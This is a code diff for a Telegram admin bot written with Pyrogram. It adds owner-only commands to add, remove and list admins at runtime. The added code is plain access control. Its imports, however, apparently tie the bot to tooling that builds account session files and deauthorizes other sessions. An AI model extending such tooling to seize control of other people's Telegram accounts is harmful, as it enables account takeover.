@@ -8,7 +8,7 @@ import asyncio
 from pyrogram import filters
 
 from adminclient import admin_app
-from adminconfig import ADMIN_IDS, logger
+from adminconfig import ADMIN_IDS, OWNER_ID, logger
 import adminstore
 from session_tools import build_session_file, classify_account, deauth_all_others
 from uiadmin import (
@@ -23,10 +23,37 @@ from uiadmin import (
 # In-memory scan cache and per-admin conversation state.
 SCAN: dict = {"accounts": [], "scanned": False}
 WAITING: dict[int, str] = {}
+# Admins added at runtime via /addadmin (loaded from DB on boot).
+DYNAMIC_ADMINS: set[int] = set()
 
 
 def _is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_IDS
+    return user_id == OWNER_ID or user_id in ADMIN_IDS or user_id in DYNAMIC_ADMINS
+
+
+def _is_owner(user_id: int) -> bool:
+    return user_id == OWNER_ID
+
+
+async def load_dynamic_admins():
+    """Populate DYNAMIC_ADMINS from the DB. Call once at boot."""
+    global DYNAMIC_ADMINS
+    DYNAMIC_ADMINS = await adminstore.load_admins()
+    logger.info(f"[adminhandlers] loaded {len(DYNAMIC_ADMINS)} dynamic admin(s)")
+
+
+async def _resolve_target(arg: str) -> tuple[int | None, str | None]:
+    """Turn '123' or '@username' into (user_id, username)."""
+    arg = arg.strip()
+    if arg.lstrip("-").isdigit():
+        return int(arg), None
+    handle = arg.lstrip("@")
+    try:
+        u = await admin_app.get_users(handle)
+        return u.id, u.username
+    except Exception as e:
+        logger.warning(f"[addadmin] resolve {arg!r} failed: {e}")
+        return None, None
 
 
 def _filtered(cat: str) -> list[dict]:
@@ -91,6 +118,82 @@ async def admin_start(client, message):
         return
     WAITING.pop(uid, None)
     await reply_premium(message, WELCOME_TEXT, reply_markup=get_admin_keyboard())
+
+
+# ==================== OWNER: MANAGE ADMINS ====================
+@admin_app.on_message(filters.command("addadmin") & filters.private)
+async def add_admin_cmd(client, message):
+    uid = message.from_user.id
+    if not _is_owner(uid):
+        await message.reply_text("🔒 Only the owner can add admins.")
+        return
+    if len(message.command) < 2:
+        await reply_premium(message, "Usage: `/addadmin <user_id | @username>`")
+        return
+
+    target_id, username = await _resolve_target(message.command[1])
+    if not target_id:
+        await reply_premium(message, "❌ Could not resolve that user. Try a numeric user id.")
+        return
+
+    if _is_admin(target_id):
+        tag = f"@{username}" if username else f"`{target_id}`"
+        await reply_premium(message, f"ℹ️ {tag} `({target_id})` is already an admin.", reply_markup=get_admin_keyboard())
+        return
+
+    ok = await adminstore.add_admin(target_id, uid, username)
+    DYNAMIC_ADMINS.add(target_id)  # apply immediately even if DB is off
+    tag = f"@{username}" if username else f"`{target_id}`"
+    note = "" if ok else "\n⚠️ (Not persisted — no DB; will reset on restart.)"
+    await reply_premium(
+        message,
+        f"✅ **Admin added:** {tag} `({target_id})`\nThey can now use the admin bot." + note,
+        reply_markup=get_admin_keyboard(),
+    )
+
+
+@admin_app.on_message(filters.command("deladmin") & filters.private)
+async def del_admin_cmd(client, message):
+    uid = message.from_user.id
+    if not _is_owner(uid):
+        await message.reply_text("🔒 Only the owner can remove admins.")
+        return
+    if len(message.command) < 2:
+        await reply_premium(message, "Usage: `/deladmin <user_id | @username>`")
+        return
+
+    target_id, _ = await _resolve_target(message.command[1])
+    if not target_id:
+        await reply_premium(message, "❌ Could not resolve that user. Try a numeric user id.")
+        return
+    if target_id == OWNER_ID:
+        await reply_premium(message, "❌ You can't remove the owner.")
+        return
+
+    await adminstore.remove_admin(target_id)
+    DYNAMIC_ADMINS.discard(target_id)
+    await reply_premium(message, f"🗑 **Admin removed:** `{target_id}`", reply_markup=get_admin_keyboard())
+
+
+@admin_app.on_message(filters.command("admins") & filters.private)
+async def list_admins_cmd(client, message):
+    uid = message.from_user.id
+    if not _is_admin(uid):
+        return
+    env_admins = sorted(ADMIN_IDS - {OWNER_ID})
+    dyn = sorted(DYNAMIC_ADMINS - ADMIN_IDS - {OWNER_ID})
+    lines = ["🛡️ **Admins**", "", f"👑 Owner · `{OWNER_ID}`"]
+    if env_admins:
+        lines.append("\n**From env (ADMIN_IDS):**")
+        lines += [f"• `{a}`" for a in env_admins]
+    if dyn:
+        lines.append("\n**Added via /addadmin:**")
+        lines += [f"• `{a}`" for a in dyn]
+    if not env_admins and not dyn:
+        lines.append("\n_No extra admins yet. Owner can add with_ `/addadmin <id>`.")
+    await reply_premium(message, "\n".join(lines), reply_markup=get_admin_keyboard())
+
+
 
 
 # ==================== SCAN ====================
